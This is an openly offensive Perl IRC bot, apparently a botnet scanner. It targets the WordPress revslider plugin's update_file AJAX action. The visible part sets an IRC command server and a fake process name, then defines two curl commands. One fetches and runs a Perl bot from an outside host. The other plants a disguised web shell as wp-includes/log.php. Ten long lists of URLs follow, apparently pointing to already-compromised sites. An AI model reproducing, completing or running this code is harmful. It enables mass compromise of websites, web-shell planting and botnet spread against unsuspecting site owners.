#!/usr/bin/perl

# nob0dy Priv8 Scanner SE v1.5
# Coded by nob0dy
# Last Edited: Sep 16 2011

# How to use:
# perl nob0dy.pl irc.server.net 6667 nick ident chan admin /usr/sbin/fakeproc
# or perl filename

use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Request::Common qw(POST);
use LWP::Simple;
use LWP 5.64;
use LWP::UserAgent;
use IO::Socket;
use IO::Socket::INET;
use IO::Select;
use Socket;
use MIME::Base64;
use File::Basename;
use URI::Escape;
use Digest::MD5 qw(md5_hex);
use DBI;


my $datetime    = localtime;
my $fakeproc  	= "fuckyou";
my $ircserver	= "irc.byroe.net";
my $ircport 	= "6667";
my $number 	= int(rand(100));
my $nickname 	= "revs[".$number."]";
my $ident     	= "rev";
my $channel   	= "";
my $admin    	= "";
my $fullname  = "2Spammer MonstrO";
my $nob0dy    = "15SexCrime";

my $searchlogo 	= "15(7@2Search15)";
my $rsqllogo 	= "15(7@12DB-Rev15)";
my $revlogo 	= "15(7@12Revslider15)";
my $revcmd	= "!rev".$number;
#my $chkcmd	= "!chk".$number;
my $plugin 	= "revslider";
my $action 	= "revslider_ajax_action";
my $update_file = "revslider.zip";
my $pubscan 	= 0;
my $spread 	= 1;
my $botxx	= uri_escape("curl -C - -O http://www.viverosgimeno.es/wp-content/rac/bss.txt;perl bss.txt;rm bss.t*");
my $c99		= uri_escape("curl -C - -O http://www.viverosgimeno.es/wp-content/rac/untitled.jpg;mv untitled.jpg ../../../../../../wp-includes/log.php;");

sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31');
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $uagent    = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6';
#my $jpath	= "/wp-includes/error.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my @randombarner1 = ("http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://viewwebinars.com/wp-includes/errors.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://iidh-jurisprudencia.ac.cr/bibliote/images/stories/error.php");

my @randombarner2 = ("http://glowform.com/wp-content/uploads/config.inc.php","http://s195003287.online.de/Platz/administrator/templates/index2.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://cmssa.com.br//php/error.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.lesyro.cz//images/stories/errors.php");

my @randombarner3 = ("http://www.an-tc.ru/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.wtpolytech.com/th/includes/config.index.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://cmssa.com.br//php/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://iidh-jurisprudencia.ac.cr/bibliote/images/stories/error.php");

my @randombarner4 = ("http://s195003287.online.de/Platz/administrator/templates/index2.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://www.muliaperkasaabadi.com/images/stories/errors.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php");

my @randombarner5 = ("http://www.mdcsystems.com/plugins/content/config.inc.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://s195003287.online.de/Platz/administrator/templates/index2.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://cmssa.com.br//php/error.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://iidh-jurisprudencia.ac.cr/bibliote/images/stories/error.php");

my @randombarner6 = ("http://glowform.com/wp-content/uploads/config.inc.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.voileenligne.com/audio/komo.php","http://209.188.87.82/error.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.wtpolytech.com/th/includes/config.index.php");

my @randombarner7 = ("http://www.lesyro.cz//images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://s195003287.online.de/Platz/administrator/templates/index2.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://s195003287.online.de/Platz/administrator/templates/index2.php","http://www.lesyro.cz//images/stories/errors.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.lesyro.cz//images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://www.remedyhospital.com.tr/eng//images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://iidh-jurisprudencia.ac.cr/bibliote/images/stories/error.php");

my @randombarner8 = ("http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.muliaperkasaabadi.com/images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.corpetrol.edu.co/corpetrol//images/stories/error.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://glowform.com/wp-content/uploads/config.inc.php","http://www.allsocool.com.au/php/error.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://glowform.com/wp-content/uploads/config.inc.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://iidh-jurisprudencia.ac.cr/bibliote/images/stories/error.php");

my @randombarner9 = ("http://viewwebinars.com/wp-includes/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://www.lesyro.cz//images/stories/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://cmssa.com.br//php/error.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://iidh-jurisprudencia.ac.cr/bibliote/images/stories/error.php");

my @randombarner10 = ("http://www.remedyhospital.com.tr/eng//images/stories/errors.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.harmonywaters.us/administrator/components/com_maian15/charts/tmp-upload-images/komo/komo.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://viewwebinars.com/wp-includes/errors.php","http://www.druhupalem.cz/images/stories/errors.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.voileenligne.com/audio/komo.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.auptitnidlorrain.fr/images/errors.php","http://www.organum.fr/images/errors.php","http://www.sibtruckservice.ru/images/errors.php","http://unhas.ac.id/farmasi/lama/images/stories/errors.php","http://motoarena.ru/images/stories/errors.php","http://www.mlmia.com//images/stories/search.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://kavkazinterpress.ru/plugins/content/config.inc.php","http://www.planville.com.br/plugins/search/config.index.php","http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php","http://apritalia.it/css/config.inc.php","http://europump.com.pl/images/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://hd.schoevers.com//logs/seka.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.allsocool.com.au/php/error.php","http://www.wtpolytech.com/th/includes/config.index.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.campenauktioner.dk//administrator/components/com_users/error.php","http://www.schirrhein.fr/error.php","http://mbuz-bcrb.ru/includes/js/calendar/lang/error.php","http://www.an-tc.ru/images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.mdcsystems.com/plugins/content/config.inc.php","http://fonio.hu/ajiu/bp.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://barbecue.by/display.by/plugins/content/config.inc.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://www.mlmia.com//images/stories/search.php","http://www.bam.co.th/bam/corporate/xmlrpc/index2.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.allsocool.com.au/php/error.php");

